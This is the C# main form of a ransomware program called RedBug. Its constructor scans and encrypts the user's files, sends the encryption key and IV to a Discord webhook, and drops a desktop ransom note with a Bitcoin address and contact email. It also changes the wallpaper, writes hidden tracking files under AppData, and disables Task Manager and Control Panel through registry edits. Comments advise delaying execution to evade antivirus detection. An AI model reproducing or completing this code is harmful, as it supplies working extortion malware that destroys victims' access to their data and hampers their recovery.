using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.Win32;
using System.Collections.Specialized;
using System.Drawing.Drawing2D;
using System.Net;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Web;
using System.Windows.Forms;
using static System.Net.WebRequestMethods;

namespace RedBug
{
    public partial class Form1 : Form
    {

        
        void RegistryEdit(string regPath, string name, string value)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                        return;
                    }
                    if (key.GetValue(name) != (object)value)
                        key.SetValue(name, value, RegistryValueKind.DWord);
                }
            }
            catch (Exception ex) { Console.WriteLine($"{ex}"); }
        }


        static void Savefileindesktop()
        {
            string path = "C:\\Users\\" + Environment.UserName + "\\Desktop\\Wallets-12304.txt";
            string data = "My personal Bitcoin Address : 1Cbyh8gLS6DweFeMSkBghDzAkj4xYBrJwU\nContact us at the E-Mail address myownemail@protonmail.com after payment, then we will respond with a Decryption-Key and Decryption-IV";

            if (!System.IO.File.Exists(path))
            {
                var c = System.IO.File.Create(path);
                c.Close();
                System.IO.File.WriteAllText(path, data);
            }

        }


        static void SendData(string key, string iv)
        {
            var URL = "https://discord.com/api/webhooks/YOUR-OWN-WEBHOOK";
            var data = new NameValueCollection()
            {
                {"content", $"KEY: {key}\n IV: {iv}" }
            };

            var c = new WebClient();
            c.UploadValues(URL, data);

        }
        void RoundForm(int radius)
        {
            var path = new GraphicsPath();
            int d = radius * 2;

            path.AddArc(0, 0, d, d, 180, 90);
            path.AddArc(Width - d, 0, d, d, 270, 90);
            path.AddArc(Width - d, Height - d, d, d, 0, 90);
            path.AddArc(0, Height - d, d, d, 90, 90);
            path.CloseFigure();

            this.Region = new Region(path);
        }


        public static int encryption_count = 0;

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SystemParametersInfo(
        int uAction, int uParam, string lpvParam, int fuWinIni);

        private const int SPI_SETDESKWALLPAPER = 20;
        private const int SPIF_UPDATEINIFILE = 0x01;
        private const int SPIF_SENDCHANGE = 0x02;

        public static void setdesktoppic()
        {
            try
            {
                string path = @$"C:\Users\{Environment.UserName}\Desktop\final-21344509211235.jpg";

                SystemParametersInfo(
                    SPI_SETDESKWALLPAPER,
                    0,
                    path,
                    SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
                );
            }
            catch { }
        }

        static void savedata(int count, List<string> files)
        {
            string path = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\sys32s32x64.txt"
                ;
            if (!System.IO.File.Exists(path))
            {
                var f = System.IO.File.Create(path);
                f.Close();

                System.IO.File.AppendAllText(path, $"{count}");
            }

            string path2 = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\sys32s32x32.txt";
            if (!System.IO.File.Exists(path2))
            {
                var f = System.IO.File.Create(path2);
                f.Close();

                string files_ = "";
                foreach (string file in files)
                {
                    files_ += $"{file}\n";
                }

                System.IO.File.AppendAllText(path2, $"{files_}");
            }
        }

        static string current = "home";
        public Form1()
        {

            Encrypt encrypt = new Encrypt();
            string key = encrypt.GetKey();
            string iv = encrypt.GetKey();

            encrypt.ScanUserFiles();

            Task.Delay(2000).Wait(); // Waiting at least 2 seconds, you can add more, this makes the detection from Windows Defender and other Anti-Virus softwares a bit more safe, you can search for the reasoning behind it on google.

            new Thread(() =>
            {
                setdesktoppic();
            }).Start(); // Sets the desktop background to the Final.JPG image

            encrypt.StartEncrypt(key, iv); // this starts the encryption

            SendData(key, iv); // this sends the Data to the Discord Webhook, informing you that a pc was infected
                               // the reason i send the data after encryption is to know for sure that the pc was infected 

            new Thread(() => { Savefileindesktop(); }).Start();

            savedata(encryption_count, encrypt.files); // this is only for debuggin in the UI dont worry about it

            // these two threads disable the Control Panel and TaskMgr
            new Thread(() => { RegistryEdit(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel", "1"); }).Start();
            new Thread(() => { RegistryEdit(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1"); }).Start();



            InitializeComponent();
            this.FormBorderStyle = FormBorderStyle.None;
            RoundForm(8);
            panel1.MouseDown += DragForm;
            panel3.MouseDown += DragForm;
            panel2.MouseDown += DragForm;
            

        }

        

        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HTCAPTION = 0x2;

        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();
        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

        private void DragForm(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(this.Handle, WM_NCLBUTTONDOWN, HTCAPTION, 0);
            }
        }


        private void label2_MouseHover(object sender, EventArgs e)
        {

            label2.ForeColor = Color.FromArgb(58, 0, 0);
        }

        private void label2_MouseLeave(object sender, EventArgs e)
        {
            if (current == "info")
            {

            }
            else
            {
                label2.ForeColor = Color.Gray;
            }

        }

        private void label2_Click(object sender, EventArgs e)
        {
            label1.ForeColor = Color.Gray;
            current = "info";
            label2.ForeColor = Color.FromArgb(58, 0, 0);
            info frm = new info();
            frm.TopLevel = false;
            frm.FormBorderStyle = FormBorderStyle.None;
            frm.Dock = DockStyle.Fill;

            panel4.Controls.Clear();
            panel4.Controls.Add(frm);
            frm.Show();

        }

        private void label1_Click(object sender, EventArgs e)
        {

            info frm = new info();
            frm.TopLevel = false;
            frm.FormBorderStyle = FormBorderStyle.None;
            frm.Dock = DockStyle.Fill;

            panel4.Controls.Clear();
            panel4.Controls.Add(frm);
            frm.Show();
        }

        Dashboard frm_dash = new Dashboard();
        private void Form1_Load(object sender, EventArgs e)
        {
            
            frm_dash.TopLevel = false;
            frm_dash.FormBorderStyle = FormBorderStyle.None;
            frm_dash.Dock = DockStyle.Fill;

            panel4.Controls.Clear();
            panel4.Controls.Add(frm_dash);
            frm_dash.Show();

            

        }


        private void label9_Click(object sender, EventArgs e)
        {
            label2.ForeColor = Color.Gray;
            current = "home";

            frm_dash.TopLevel = false;
            frm_dash.FormBorderStyle = FormBorderStyle.None;
            frm_dash.Dock = DockStyle.Fill;

            panel4.Controls.Clear();
            panel4.Controls.Add(frm_dash);
            frm_dash.Show();
        }

        private void label1_MouseLeave(object sender, EventArgs e)
        {
            if (current == "home")
            {
                label1.ForeColor = Color.FromArgb(58, 0, 0);
            }
            else
            {
                label1.ForeColor = Color.Gray;
            }

        }

        private void label1_MouseHover(object sender, EventArgs e)
        {
            label1.ForeColor = Color.FromArgb(58, 0, 0);
        }
        

    }
}
